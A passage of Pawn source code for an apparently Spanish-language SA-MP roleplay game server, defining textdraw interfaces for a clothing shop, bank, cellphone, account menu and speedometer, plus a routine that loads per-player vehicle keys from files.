	TextDrawLetterSize(CRopa, 0.500000, 1.600000);
	TextDrawColor(CRopa, -1);
	TextDrawSetOutline(CRopa, 1);
	TextDrawSetProportional(CRopa, 1);
	TextDrawUseBox(CRopa, 1);
	TextDrawBoxColor(CRopa, 2105376125);
	TextDrawTextSize(CRopa, 474.000000, 30);

	SCRopa = TextDrawCreate(180.000000, 340.000000, "salir");
	TextDrawBackgroundColor(SCRopa, 255);
	TextDrawFont(SCRopa, 3);
	TextDrawLetterSize(SCRopa, 0.500000, 1.600000);
	TextDrawColor(SCRopa, -1);
	TextDrawSetOutline(SCRopa, 1);
	TextDrawSetProportional(SCRopa, 1);
	TextDrawUseBox(SCRopa, 1);
	TextDrawBoxColor(SCRopa, 2105376125);
	TextDrawTextSize(SCRopa, 222.000000, 30);

	PCRopa = TextDrawCreate(420.000000, 358.000000, "~g~$400");
	TextDrawBackgroundColor(PCRopa, 255);
	TextDrawFont(PCRopa, 3);
	TextDrawLetterSize(PCRopa, 0.500000, 1.600000);
	TextDrawColor(PCRopa, -1);
	TextDrawSetOutline(PCRopa, 1);
	TextDrawSetProportional(PCRopa, 1);
	TextDrawUseBox(PCRopa, 1);
	TextDrawBoxColor(PCRopa, 2105376125);
	TextDrawTextSize(PCRopa, 461.000000, 10);

	//BANCO

	Operaciones[0] = TextDrawCreate(60.000000, 210.000000, "DEPOSITAR");
	TextDrawBackgroundColor(Operaciones[0], 255);
	TextDrawFont(Operaciones[0], 2);
	TextDrawLetterSize(Operaciones[0], 0.500000, 3.799999);
	TextDrawColor(Operaciones[0], -1);
	TextDrawSetOutline(Operaciones[0], 1);
	TextDrawSetProportional(Operaciones[0], 1);
	TextDrawUseBox(Operaciones[0], 1);
	TextDrawBoxColor(Operaciones[0], 44287);
	TextDrawTextSize(Operaciones[0], 178.000000, 40.000000);

	Operaciones[1] = TextDrawCreate(247.000000, 210.000000, "retirar");
	TextDrawBackgroundColor(Operaciones[1], 255);
	TextDrawFont(Operaciones[1], 2);
	TextDrawLetterSize(Operaciones[1], 0.780000, 3.799999);
	TextDrawColor(Operaciones[1], -1);
	TextDrawSetOutline(Operaciones[1], 1);
	TextDrawSetProportional(Operaciones[1], 1);
	TextDrawUseBox(Operaciones[1], 1);
	TextDrawBoxColor(Operaciones[1], 44287);
	TextDrawTextSize(Operaciones[1], 381.000000, 40.000000);

	Operaciones[2] = TextDrawCreate(450.000000, 210.000000, "transferir");
	TextDrawBackgroundColor(Operaciones[2], 255);
	TextDrawFont(Operaciones[2], 2);
	TextDrawLetterSize(Operaciones[2], 0.540000, 3.799999);
	TextDrawColor(Operaciones[2], -1);
	TextDrawSetOutline(Operaciones[2], 1);
	TextDrawSetProportional(Operaciones[2], 1);
	TextDrawUseBox(Operaciones[2], 1);
	TextDrawBoxColor(Operaciones[2], 44287);
	TextDrawTextSize(Operaciones[2], 587.000000, 40.000000);

	SCajero = TextDrawCreate(531.000000, 52.000000, "~b~~h~~h~salir");
	TextDrawBackgroundColor(SCajero, 255);
	TextDrawFont(SCajero, 2);
	TextDrawLetterSize(SCajero, 0.600000, 1.799999);
	TextDrawColor(SCajero, -1);
	TextDrawSetOutline(SCajero, 1);
	TextDrawSetProportional(SCajero, 1);
	TextDrawUseBox(SCajero, 1);
	TextDrawBoxColor(SCajero, -131);
	TextDrawTextSize(SCajero, 605.000000, 30);

   	Vendado = TextDrawCreate(0.000000, 0.000000, "_");
	TextDrawBackgroundColor(Vendado, 255);
	TextDrawFont(Vendado, 1);
	TextDrawLetterSize(Vendado, 0.500000, 54.000000);
	TextDrawColor(Vendado, -1);
	TextDrawSetOutline(Vendado, 0);
	TextDrawSetProportional(Vendado, 1);
	TextDrawSetShadow(Vendado, 1);
	TextDrawUseBox(Vendado, 1);
	TextDrawBoxColor(Vendado, 255);
	TextDrawTextSize(Vendado, 650.000000, 0.000000);

	// Sistema de celulares
	Celular[0] = TextDrawCreate(259.000000, 100.000000, "_");
	TextDrawBackgroundColor(Celular[0], 255);
	TextDrawFont(Celular[0], 1);
	TextDrawLetterSize(Celular[0], 1.009999, 25.200004);
	TextDrawColor(Celular[0], -1);
	TextDrawSetOutline(Celular[0], 0);
	TextDrawSetProportional(Celular[0], 1);
	TextDrawSetShadow(Celular[0], 1);
	TextDrawUseBox(Celular[0], 1);
	TextDrawBoxColor(Celular[0], 255);
	TextDrawTextSize(Celular[0], 389.000000, 1.000000);

	Celular[1] = TextDrawCreate(264.000000, 116.000000, "");
	TextDrawBackgroundColor(Celular[1], 255);
	TextDrawFont(Celular[1], 1);
	TextDrawLetterSize(Celular[1], 0.000000, 20.799999);
	TextDrawColor(Celular[1], -1);
	TextDrawSetOutline(Celular[1], 0);
	TextDrawSetProportional(Celular[1], 1);
	TextDrawSetShadow(Celular[1], 1);
	TextDrawUseBox(Celular[1], 1);
	TextDrawBoxColor(Celular[1], 0xA4A3A2FF);
	TextDrawTextSize(Celular[1], 384.000000, -2.000000);

	Celular[2] = TextDrawCreate(309.000000, 308.000000, "ld_beat:circle");
	TextDrawBackgroundColor(Celular[2], 255);
	TextDrawFont(Celular[2], 4);
	TextDrawLetterSize(Celular[2], 0.500000, 1.000000);
	TextDrawColor(Celular[2], -1);
	TextDrawSetOutline(Celular[2], 0);
	TextDrawSetProportional(Celular[2], 1);
	TextDrawSetShadow(Celular[2], 1);
	TextDrawUseBox(Celular[2], 1);
	TextDrawBoxColor(Celular[2], 255);
	TextDrawTextSize(Celular[2], 26.000000, 20.000000);

	Celular[3] = TextDrawCreate(270.000000, 310.000000, "- -");
	TextDrawBackgroundColor(Celular[3], 255);
	TextDrawFont(Celular[3], 1);
	TextDrawLetterSize(Celular[3], 2.370000, 1.400000);
	TextDrawColor(Celular[3], -1);
	TextDrawSetOutline(Celular[3], 1);
	TextDrawSetProportional(Celular[3], 1);

	HoraCel = TextDrawCreate(339.000000, 112.000000, "24:21");
	TextDrawBackgroundColor(HoraCel, 255);
	TextDrawFont(HoraCel, 2);
	TextDrawLetterSize(HoraCel, 0.380000, 1.200000);
	TextDrawColor(HoraCel, -1);
	TextDrawSetOutline(HoraCel, 1);
	TextDrawSetProportional(HoraCel, 1);

	Celular[4] = TextDrawCreate(263.000000, 116.000000, "~g~llll~r~ll");
	TextDrawBackgroundColor(Celular[4], 255);
	TextDrawFont(Celular[4], 1);
	TextDrawLetterSize(Celular[4], 0.400000, 0.600000);
	TextDrawColor(Celular[4], -1);
	TextDrawSetOutline(Celular[4], 1);
	TextDrawSetProportional(Celular[4], 1);
	TextDrawUseBox(Celular[4], 1);
	TextDrawBoxColor(Celular[4], 13107325);
	TextDrawTextSize(Celular[4], 384.000000, 0.000000);

	Celular[5] = TextDrawCreate(271.000000, 99.000000, "optimus ~p~rp");
	TextDrawBackgroundColor(Celular[5], 255);
	TextDrawFont(Celular[5], 3);
	TextDrawLetterSize(Celular[5], 0.500000, 1.000000);
	TextDrawColor(Celular[5], -1);
	TextDrawSetOutline(Celular[5], 0);
	TextDrawSetProportional(Celular[5], 1);
	TextDrawSetShadow(Celular[5], 1);

	Celular[6] = TextDrawCreate(350.000000, 280.000000, "#");
	TextDrawBackgroundColor(Celular[6], 255);
	TextDrawFont(Celular[6], 1);
	TextDrawLetterSize(Celular[6], 0.900000, 2.000000);
	TextDrawColor(Celular[6], -1);
	TextDrawSetOutline(Celular[6], 1);
	TextDrawSetProportional(Celular[6], 1);
	TextDrawUseBox(Celular[6], 1);
	TextDrawBoxColor(Celular[6], -939523956);
	TextDrawTextSize(Celular[6], 377.000000, 50.000000);

	BorrarCel = TextDrawCreate(271.000000, 280.000000, "borrar~n~    /");
	TextDrawBackgroundColor(BorrarCel, 255);
	TextDrawFont(BorrarCel, 1);
	TextDrawLetterSize(BorrarCel, 0.259999, 0.999999);
	TextDrawColor(BorrarCel, -1);
	TextDrawSetOutline(BorrarCel, 1);
	TextDrawSetProportional(BorrarCel, 1);
	TextDrawUseBox(BorrarCel, 1);
	TextDrawBoxColor(BorrarCel, -939523956);
	TextDrawTextSize(BorrarCel, 300.000000, 50.000000);

	NumeroCel[0] = TextDrawCreate(312.000000, 280.000000, "0");
	TextDrawBackgroundColor(NumeroCel[0], 255);
	TextDrawFont(NumeroCel[0], 1);
	TextDrawLetterSize(NumeroCel[0], 1.019999, 1.999999);
	TextDrawColor(NumeroCel[0], -1);
	TextDrawSetOutline(NumeroCel[0], 1);
	TextDrawSetProportional(NumeroCel[0], 1);
	TextDrawUseBox(NumeroCel[0], 1);
	TextDrawBoxColor(NumeroCel[0], -939523956);
	TextDrawTextSize(NumeroCel[0], 337.000000, 20);

	NumeroCel[1] = TextDrawCreate(271.000000, 178.000000, "1");
	TextDrawBackgroundColor(NumeroCel[1], 255);
	TextDrawFont(NumeroCel[1], 1);
	TextDrawLetterSize(NumeroCel[1], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[1], -1);
	TextDrawSetOutline(NumeroCel[1], 1);
	TextDrawSetProportional(NumeroCel[1], 1);
	TextDrawUseBox(NumeroCel[1], 1);
	TextDrawBoxColor(NumeroCel[1], -939523956);
	TextDrawTextSize(NumeroCel[1], 300.000000, 20);

	NumeroCel[2] = TextDrawCreate(312.000000, 178.000000, "2");
	TextDrawBackgroundColor(NumeroCel[2], 255);
	TextDrawFont(NumeroCel[2], 1);
	TextDrawLetterSize(NumeroCel[2], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[2], -1);
	TextDrawSetOutline(NumeroCel[2], 1);
	TextDrawSetProportional(NumeroCel[2], 1);
	TextDrawUseBox(NumeroCel[2], 1);
	TextDrawBoxColor(NumeroCel[2], -939523956);
	TextDrawTextSize(NumeroCel[2], 337.000000, 20);

	NumeroCel[3] = TextDrawCreate(351.000000, 178.000000, "3");
	TextDrawBackgroundColor(NumeroCel[3], 255);
	TextDrawFont(NumeroCel[3], 1);
	TextDrawLetterSize(NumeroCel[3], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[3], -1);
	TextDrawSetOutline(NumeroCel[3], 1);
	TextDrawSetProportional(NumeroCel[3], 1);
	TextDrawUseBox(NumeroCel[3], 1);
	TextDrawBoxColor(NumeroCel[3], -939523956);
	TextDrawTextSize(NumeroCel[3], 377.000000, 20);

	NumeroCel[4] = TextDrawCreate(271.000000, 212.000000, "4");
	TextDrawBackgroundColor(NumeroCel[4], 255);
	TextDrawFont(NumeroCel[4], 1);
	TextDrawLetterSize(NumeroCel[4], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[4], -1);
	TextDrawSetOutline(NumeroCel[4], 1);
	TextDrawSetProportional(NumeroCel[4], 1);
	TextDrawUseBox(NumeroCel[4], 1);
	TextDrawBoxColor(NumeroCel[4], -939523956);
	TextDrawTextSize(NumeroCel[4], 300.000000, 20);

	NumeroCel[5] = TextDrawCreate(312.000000, 212.000000, "5");
	TextDrawBackgroundColor(NumeroCel[5], 255);
	TextDrawFont(NumeroCel[5], 1);
	TextDrawLetterSize(NumeroCel[5], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[5], -1);
	TextDrawSetOutline(NumeroCel[5], 1);
	TextDrawSetProportional(NumeroCel[5], 1);
	TextDrawUseBox(NumeroCel[5], 1);
	TextDrawBoxColor(NumeroCel[5], -939523956);
	TextDrawTextSize(NumeroCel[5], 337.000000, 20);

	NumeroCel[6] = TextDrawCreate(351.000000, 212.000000, "6");
	TextDrawBackgroundColor(NumeroCel[6], 255);
	TextDrawFont(NumeroCel[6], 1);
	TextDrawLetterSize(NumeroCel[6], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[6], -1);
	TextDrawSetOutline(NumeroCel[6], 1);
	TextDrawSetProportional(NumeroCel[6], 1);
	TextDrawUseBox(NumeroCel[6], 1);
	TextDrawBoxColor(NumeroCel[6], -939523956);
	TextDrawTextSize(NumeroCel[6], 377.000000, 20);

	NumeroCel[7] = TextDrawCreate(271.000000, 246.000000, "7");
	TextDrawBackgroundColor(NumeroCel[7], 255);
	TextDrawFont(NumeroCel[7], 1);
	TextDrawLetterSize(NumeroCel[7], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[7], -1);
	TextDrawSetOutline(NumeroCel[7], 1);
	TextDrawSetProportional(NumeroCel[7], 1);
	TextDrawUseBox(NumeroCel[7], 1);
	TextDrawBoxColor(NumeroCel[7], -939523956);
	TextDrawTextSize(NumeroCel[7], 300.000000, 20);

	NumeroCel[8] = TextDrawCreate(312.000000, 246.000000, "8");
	TextDrawBackgroundColor(NumeroCel[8], 255);
	TextDrawFont(NumeroCel[8], 1);
	TextDrawLetterSize(NumeroCel[8], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[8], -1);
	TextDrawSetOutline(NumeroCel[8], 1);
	TextDrawSetProportional(NumeroCel[8], 1);
	TextDrawUseBox(NumeroCel[8], 1);
	TextDrawBoxColor(NumeroCel[8], -939523956);
	TextDrawTextSize(NumeroCel[8], 337.000000, 20);

	NumeroCel[9] = TextDrawCreate(351.000000, 246.000000, "9");
	TextDrawBackgroundColor(NumeroCel[9], 255);
	TextDrawFont(NumeroCel[9], 1);
	TextDrawLetterSize(NumeroCel[9], 1.069999, 2.499999);
	TextDrawColor(NumeroCel[9], -1);
	TextDrawSetOutline(NumeroCel[9], 1);
	TextDrawSetProportional(NumeroCel[9], 1);
	TextDrawUseBox(NumeroCel[9], 1);
	TextDrawBoxColor(NumeroCel[9], -939523956);
	TextDrawTextSize(NumeroCel[9], 377.000000, 20);


	Llamar_Mensaje[0] = TextDrawCreate(270.000000, 161.000000, "atras");
	TextDrawBackgroundColor(Llamar_Mensaje[0], 255);
	TextDrawFont(Llamar_Mensaje[0], 3);
	TextDrawLetterSize(Llamar_Mensaje[0], 0.369999, 0.999999);
	TextDrawColor(Llamar_Mensaje[0], -1);
	TextDrawSetOutline(Llamar_Mensaje[0], 1);
	TextDrawSetProportional(Llamar_Mensaje[0], 1);
	TextDrawUseBox(Llamar_Mensaje[0], 0);
	TextDrawBoxColor(Llamar_Mensaje[0], -939523956);
	TextDrawTextSize(Llamar_Mensaje[0], 300.000000, 10);

	Llamar_Mensaje[1] = TextDrawCreate(337.000000, 161.000000, "opciones");
	TextDrawBackgroundColor(Llamar_Mensaje[1], 255);
	TextDrawFont(Llamar_Mensaje[1], 3);
	TextDrawLetterSize(Llamar_Mensaje[1], 0.289999, 0.999999);
	TextDrawColor(Llamar_Mensaje[1], -1);
	TextDrawSetOutline(Llamar_Mensaje[1], 1);
	TextDrawSetProportional(Llamar_Mensaje[1], 1);
	TextDrawTextSize(Llamar_Mensaje[1], 377.000000, 10);

	IconoCel[0] = TextDrawCreate(271.000000, 148.000000, "hud:arrow");
	TextDrawBackgroundColor(IconoCel[0], 255);
	TextDrawFont(IconoCel[0], 4);
	TextDrawLetterSize(IconoCel[0], 0.500000, 1.000000);
	TextDrawColor(IconoCel[0], -1);
	TextDrawSetOutline(IconoCel[0], 0);
	TextDrawSetProportional(IconoCel[0], 1);
	TextDrawSetShadow(IconoCel[0], 1);
	TextDrawUseBox(IconoCel[0], 1);
	TextDrawBoxColor(IconoCel[0], 255);
	TextDrawTextSize(IconoCel[0], 28.000000, 28.000000);

	IconoCel[1] = TextDrawCreate(336.000000, 153.000000, "hud:radar_mafiacasino");
	TextDrawBackgroundColor(IconoCel[1], 255);
	TextDrawFont(IconoCel[1], 4);
	TextDrawLetterSize(IconoCel[1], 0.500000, 1.000000);
	TextDrawColor(IconoCel[1], -1);
	TextDrawSetOutline(IconoCel[1], 0);
	TextDrawSetProportional(IconoCel[1], 1);
	TextDrawSetShadow(IconoCel[1], 1);
	TextDrawUseBox(IconoCel[1], 1);
	TextDrawBoxColor(IconoCel[1], 255);
	TextDrawTextSize(IconoCel[1], 30.000000, 20.000000);

	IconoCel[2] = TextDrawCreate(273.000000, 194.000000, "hud:radar_datedisco");
	TextDrawBackgroundColor(IconoCel[2] , 255);
	TextDrawFont(IconoCel[2] , 4);
	TextDrawLetterSize(IconoCel[2] , 0.500000, 1.000000);
	TextDrawColor(IconoCel[2] , -1);
	TextDrawSetOutline(IconoCel[2] , 0);
	TextDrawSetProportional(IconoCel[2] , 1);
	TextDrawSetShadow(IconoCel[2] , 1);
	TextDrawUseBox(IconoCel[2] , 1);
	TextDrawBoxColor(IconoCel[2] , 255);
	TextDrawTextSize(IconoCel[2] , 27.000000, 21.000000);

	IconoCel[3] = TextDrawCreate(335.000000, 194.000000, "hud:radar_gangb");
	TextDrawBackgroundColor(IconoCel[3], 255);
	TextDrawFont(IconoCel[3], 4);
	TextDrawLetterSize(IconoCel[3], 0.500000, 1.000000);
	TextDrawColor(IconoCel[3], -1);
	TextDrawSetOutline(IconoCel[3], 0);
	TextDrawSetProportional(IconoCel[3], 1);
	TextDrawSetShadow(IconoCel[3], 1);
	TextDrawUseBox(IconoCel[3], 1);
	TextDrawBoxColor(IconoCel[3], 255);
	TextDrawTextSize(IconoCel[3], 27.000000, 21.000000);

	VolverCel = TextDrawCreate(273.000000, 277.000000, "ld_beat:left");
	TextDrawBackgroundColor(VolverCel, 255);
	TextDrawFont(VolverCel, 4);
	TextDrawLetterSize(VolverCel, 0.500000, 1.000000);
	TextDrawColor(VolverCel, -1);
	TextDrawSetOutline(VolverCel, 0);
	TextDrawSetProportional(VolverCel, 1);
	TextDrawSetShadow(VolverCel, 1);
	TextDrawUseBox(VolverCel, 1);
	TextDrawBoxColor(VolverCel, 255);
	TextDrawTextSize(VolverCel, 27.000000, 21.000000);


	//SISTEMA DE CUENTA
	CuentaBox = TextDrawCreate(60.000000, 291.000000, "_");
	TextDrawBackgroundColor(CuentaBox, 255);
	TextDrawFont(CuentaBox, 1);
	TextDrawLetterSize(CuentaBox, 0.600000, 3.700001);
	TextDrawColor(CuentaBox, -1);
	TextDrawSetOutline(CuentaBox, 0);
	TextDrawSetProportional(CuentaBox, 1);
	TextDrawSetShadow(CuentaBox, 1);
	TextDrawUseBox(CuentaBox, 1);
	TextDrawBoxColor(CuentaBox, -1768515946);
	TextDrawTextSize(CuentaBox, 560.000000, 0.000000);

	CuentaGen = TextDrawCreate(167.000000, 300.000000, "general");
	TextDrawBackgroundColor(CuentaGen, 255);
	TextDrawFont(CuentaGen, 3);
	TextDrawLetterSize(CuentaGen, 0.520000, 1.800000);
	TextDrawColor(CuentaGen, 2052048639);
	TextDrawSetOutline(CuentaGen, 1);
	TextDrawSetProportional(CuentaGen, 1);
	TextDrawTextSize(CuentaGen, 236.000000, 40.000000);

	CuentaCas = TextDrawCreate(270.000000, 300.000000, "casas");
	TextDrawBackgroundColor(CuentaCas, 255);
	TextDrawFont(CuentaCas, 3);
	TextDrawLetterSize(CuentaCas, 0.520000, 1.800000);
	TextDrawColor(CuentaCas, 2052048639);
	TextDrawSetOutline(CuentaCas, 1);
	TextDrawSetProportional(CuentaCas, 1);
	TextDrawTextSize(CuentaCas, 323.000000, 40.000000);

	CuentaNeg = TextDrawCreate(360.000000, 300.000000, "negocios");
	TextDrawBackgroundColor(CuentaNeg, 255);
	TextDrawFont(CuentaNeg, 3);
	TextDrawLetterSize(CuentaNeg, 0.520000, 1.800000);
	TextDrawColor(CuentaNeg, 2052048639);
	TextDrawSetOutline(CuentaNeg, 1);
	TextDrawSetProportional(CuentaNeg, 1);
	TextDrawTextSize(CuentaNeg, 436.000000, 40.000000);

	CuentaVeh = TextDrawCreate(458.000000, 300.000000, "vehiculos");
	TextDrawBackgroundColor(CuentaVeh, 255);
	TextDrawFont(CuentaVeh, 3);
	TextDrawLetterSize(CuentaVeh, 0.520000, 1.800000);
	TextDrawColor(CuentaVeh, 2052048639);
	TextDrawSetOutline(CuentaVeh, 1);
	TextDrawSetProportional(CuentaVeh, 1);
	TextDrawTextSize(CuentaVeh, 544.000000, 40.000000);

	CuentaArmas = TextDrawCreate(77.000000, 300.000000, "armas");
	TextDrawBackgroundColor(CuentaArmas, 255);
	TextDrawFont(CuentaArmas, 3);
	TextDrawLetterSize(CuentaArmas, 0.519999, 1.799999);
	TextDrawColor(CuentaArmas, 2052048639);
	TextDrawSetOutline(CuentaArmas, 1);
	TextDrawSetProportional(CuentaArmas, 1);
	TextDrawBoxColor(CuentaArmas, 255);
	TextDrawTextSize(CuentaArmas, 136.000000, 40.000000);


	//Clickeables:
	TextDrawSetSelectable(FlechaSexo[0],1);
	TextDrawSetSelectable(FlechaSexo[1],1);
	TextDrawSetSelectable(FlechaEdad[0],1);
	TextDrawSetSelectable(FlechaEdad[1],1);
	TextDrawSetSelectable(FlechaPelea[0],1);
	TextDrawSetSelectable(FlechaPelea[1],1);
	TextDrawSetSelectable(FlechaEstilo[0],1);
	TextDrawSetSelectable(FlechaEstilo[1],1);
	TextDrawSetSelectable(Registro[5],1);
	TextDrawSetSelectable(FlechaCRopa[0],1);
	TextDrawSetSelectable(FlechaCRopa[1],1);
	TextDrawSetSelectable(CRopa,1);
	TextDrawSetSelectable(SCRopa,1);
	TextDrawSetSelectable(Operaciones[0],1);
	TextDrawSetSelectable(Operaciones[1],1);
	TextDrawSetSelectable(Operaciones[2],1);
	TextDrawSetSelectable(SCajero,1);
	Loop(i,10,0) TextDrawSetSelectable(NumeroCel[i],1);
	TextDrawSetSelectable(Llamar_Mensaje[0],1);
	TextDrawSetSelectable(Llamar_Mensaje[1],1);
	TextDrawSetSelectable(BorrarCel,1);
	Loop(i,4,0) TextDrawSetSelectable(IconoCel[i],1);
	TextDrawSetSelectable(VolverCel,1);
	TextDrawSetSelectable(CuentaGen,1);
	TextDrawSetSelectable(CuentaCas,1);
	TextDrawSetSelectable(CuentaNeg,1);
	TextDrawSetSelectable(CuentaVeh,1);
	TextDrawSetSelectable(CuentaArmas,1);
	TextDrawSetSelectable(TDTV[4], 1);
	//TextDrawSetSelectable(TDTV[7], 1);
	//TextDrawSetSelectable(TDTV[8], 1);

	// Velocimetro
	Velocimetro[0] = TextDrawCreate(240.000000, 400.000000, "_");
	TextDrawBackgroundColor(Velocimetro[0], 255);
	TextDrawFont(Velocimetro[0], 1);
	TextDrawLetterSize(Velocimetro[0], 0.539999, 2.700002);
	TextDrawColor(Velocimetro[0], -1);
	TextDrawSetOutline(Velocimetro[0], 0);
	TextDrawSetProportional(Velocimetro[0], 1);
	TextDrawSetShadow(Velocimetro[0], 1);
	TextDrawUseBox(Velocimetro[0], 1);
	TextDrawBoxColor(Velocimetro[0], 336860310);
	TextDrawTextSize(Velocimetro[0], 370.000000, 0.000000);

	Velocimetro[1] = TextDrawCreate(243.000000, 404.000000, "_");
	TextDrawBackgroundColor(Velocimetro[1], 255);
	TextDrawFont(Velocimetro[1], 1);
	TextDrawLetterSize(Velocimetro[1], 0.539999, 7.300000);
	TextDrawColor(Velocimetro[1], -1);
	TextDrawSetOutline(Velocimetro[1], 0);
	TextDrawSetProportional(Velocimetro[1], 1);
	TextDrawSetShadow(Velocimetro[1], 1);
	TextDrawUseBox(Velocimetro[1], 1);
	TextDrawBoxColor(Velocimetro[1], -1768515886);
	TextDrawTextSize(Velocimetro[1], 367.000000, 0.000000);

	Velocimetro[2] = TextDrawCreate(250.000000, 432.000000, "km/h");
	TextDrawBackgroundColor(Velocimetro[2], 255);
	TextDrawFont(Velocimetro[2], 3);
	TextDrawLetterSize(Velocimetro[2], 0.400000, 1.000000);
	TextDrawColor(Velocimetro[2], -1);
	TextDrawSetOutline(Velocimetro[2], 1);
	TextDrawSetProportional(Velocimetro[2], 1);

	Velocimetro[3] = TextDrawCreate(305.000000, 404.000000, "combustible");
	TextDrawBackgroundColor(Velocimetro[3], 255);
	TextDrawFont(Velocimetro[3], 2);
	TextDrawLetterSize(Velocimetro[3], 0.200000, 1.000000);
	TextDrawColor(Velocimetro[3], -1);
	TextDrawSetOutline(Velocimetro[3], 1);
	TextDrawSetProportional(Velocimetro[3], 1);

	Velocimetro[4] = TextDrawCreate(312.000000, 423.000000, "estado");
	TextDrawBackgroundColor(Velocimetro[4], 255);
	TextDrawFont(Velocimetro[4], 2);
	TextDrawLetterSize(Velocimetro[4], 0.200000, 1.000000);
	TextDrawColor(Velocimetro[4], -1);
	TextDrawSetOutline(Velocimetro[4], 1);
	TextDrawSetProportional(Velocimetro[4], 1);

	return 1;
}


stock CargarPText(i)
{
	// Celulares
	Numero[i] = CreatePlayerTextDraw(i,269.000000, 130.000000, "0");
	PlayerTextDrawBackgroundColor(i,Numero[i], 255);
	PlayerTextDrawFont(i,Numero[i], 2);
	PlayerTextDrawLetterSize(i,Numero[i], 0.399999, 2.399999);
	PlayerTextDrawColor(i,Numero[i], -1);
	PlayerTextDrawSetOutline(i,Numero[i], 1);
	PlayerTextDrawSetProportional(i,Numero[i], 1);
	PlayerTextDrawUseBox(i,Numero[i], 1);
	PlayerTextDrawBoxColor(i,Numero[i], 851996360);
	PlayerTextDrawTextSize(i,Numero[i], 379.000000, 10.000000);

	MenuCel[i] = CreatePlayerTextDraw(i,295.000000, 132.000000, "Menu");
	PlayerTextDrawBackgroundColor(i,MenuCel[i], 255);
	PlayerTextDrawFont(i,MenuCel[i], 3);
	PlayerTextDrawLetterSize(i,MenuCel[i], 0.529999, 1.200000);
	PlayerTextDrawColor(i,MenuCel[i], -1);
	PlayerTextDrawSetOutline(i,MenuCel[i], 1);
	PlayerTextDrawSetProportional(i,MenuCel[i], 1);

	Loop(c,10,0)
	{
		CelContactos[i][c] = CreatePlayerTextDraw(i,270.000000, 150+(c*10), "_");
		PlayerTextDrawBackgroundColor(i,CelContactos[i][c], 255);
		PlayerTextDrawFont(i,CelContactos[i][c], 1);
		PlayerTextDrawLetterSize(i,CelContactos[i][c],  0.400000, 1.000000);
		PlayerTextDrawColor(i,CelContactos[i][c], -1);
		PlayerTextDrawSetOutline(i,CelContactos[i][c], 1);
		PlayerTextDrawSetProportional(i,CelContactos[i][c], 1);
		PlayerTextDrawTextSize(i,CelContactos[i][c],374.000000, 10.000000);
	}

	//Barras
	if(BExp[i] == INVALID_BAR_ID)
		BExp[i] = CreateProgressBar(38.00, 436.00, 182.50, 3.20, C_BLANCO, 100.0, true);

	if(BHambre[i] == INVALID_BAR_ID)
		BHambre[i] = CreateProgressBar(390.00, 436.00, 68.50, 3.20, 0xFF7D00FF, 100.0, true);

	if(BCansancio[i] == INVALID_BAR_ID)
		BCansancio[i] = CreateProgressBar(470.00, 436.00, 68.50, 3.20, C_CANSANCIO, 100.0, true);

	if(BOrina[i] == INVALID_BAR_ID)
		BOrina[i] = CreateProgressBar(550.00, 436.00, 68.50, 3.20, C_AMARILLO, 100.0, true);

	if(BMotor[i] == INVALID_BAR_ID)
		BMotor[i] = CreateProgressBar(293.00, 163.00, 73.50, 7.50, 0x919FB2FF, 100.0);

	if(BCombustible[i] == INVALID_BAR_ID)
	 	BCombustible[i] = CreateProgressBar(306.00, 416.00, 55.50, 3.20, 0x9EA0FFFF, 100.0);

	if(BEstadoVeh[i] == INVALID_BAR_ID)
		BEstadoVeh[i] = CreateProgressBar(306.00, 436.00, 55.50, 3.20, 0x9EA0FFFF, 1000.0);

	if(BCosecha[i] == INVALID_BAR_ID)
		BCosecha[i] = CreateProgressBar(375.00, 419.00, 262.50, 4.50, C_ROJO,    15);

	//Velocimetro
    VelocidadV[i] = CreatePlayerTextDraw(i,246.000000, 408.000000, "~b~~h~~h~0");
	PlayerTextDrawBackgroundColor(i,VelocidadV[i], 255);
	PlayerTextDrawFont(i,VelocidadV[i], 3);
	PlayerTextDrawLetterSize(i,VelocidadV[i], 0.700000, 2.000000);
	PlayerTextDrawColor(i,VelocidadV[i], -1);
	PlayerTextDrawSetOutline(i,VelocidadV[i], 1);
	PlayerTextDrawSetProportional(i,VelocidadV[i], 1);

	TDContadorKM[i] = CreatePlayerTextDraw(i,530.000000, 411.000000, "-9999");
	PlayerTextDrawBackgroundColor(i,TDContadorKM[i], 255);
	PlayerTextDrawFont(i,TDContadorKM[i], 2);
	PlayerTextDrawLetterSize(i,TDContadorKM[i], 0.320000, 1.000000);
	PlayerTextDrawColor(i,TDContadorKM[i], -1);
	PlayerTextDrawSetOutline(i,TDContadorKM[i], 1);
	PlayerTextDrawSetProportional(i,TDContadorKM[i], 1);

	//Banco
	Cuenta_Balance[0][i] = CreatePlayerTextDraw(i,398.000000, 10.000000, "Cuenta: ~r~DESCONOCIDO");
	PlayerTextDrawBackgroundColor(i,Cuenta_Balance[0][i], 255);
	PlayerTextDrawFont(i,Cuenta_Balance[0][i], 1);
	PlayerTextDrawLetterSize(i,Cuenta_Balance[0][i],0.509999, 2.800000);
	PlayerTextDrawColor(i,Cuenta_Balance[0][i], -1);
	PlayerTextDrawSetOutline(i,Cuenta_Balance[0][i], 0);
	PlayerTextDrawSetProportional(i,Cuenta_Balance[0][i], 1);
	PlayerTextDrawSetShadow(i,Cuenta_Balance[0][i], 1);

	Cuenta_Balance[1][i] = CreatePlayerTextDraw(i,130.000000, 334.000000, "balance: ~g~$0");
	PlayerTextDrawBackgroundColor(i,Cuenta_Balance[1][i], 255);
	PlayerTextDrawFont(i,Cuenta_Balance[1][i], 2);
	PlayerTextDrawLetterSize(i,Cuenta_Balance[1][i], 0.820000, 3.000000);
	PlayerTextDrawColor(i,Cuenta_Balance[1][i], -1);
	PlayerTextDrawSetOutline(i,Cuenta_Balance[1][i], 0);
	PlayerTextDrawSetProportional(i,Cuenta_Balance[1][i], 1);
	PlayerTextDrawSetShadow(i,Cuenta_Balance[1][i], 1);

	return 1;
}

stock CargarLlaves(playerid)
{
	new
	    Path[20+MAX_PLAYER_NAME],
		VehID_K;

	A_Format(Path, "Vehiculos/Llaves/%s.ini", pName(playerid));

	if(!fexist(Path)) return 0;

	new
		File:Fileh = fopen(Path, io_read),
		str[5];

	while(fread(Fileh, str))
	{
	    sscanf(str, "i", VehID_K);
	    Bit_Set(Llave_veh[playerid], VehID_K, true);
	}
